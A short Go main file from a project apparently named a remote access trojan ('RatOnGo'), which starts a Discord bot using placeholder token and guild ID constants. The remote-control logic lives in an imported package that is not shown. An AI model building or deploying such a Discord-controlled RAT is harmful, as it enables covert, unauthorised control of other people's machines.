package main

import (
	"RatOnGo/discord"
)

const (
	DiscordToken = "YOUR_BOT_TOKEN_HERE"
	GuildID      = "YOUR_GUILD_ID_HERE"
)

func main() {
	if DiscordToken == "" || GuildID == "" {
		return
	}

	discord.StartBot(DiscordToken, GuildID)
}
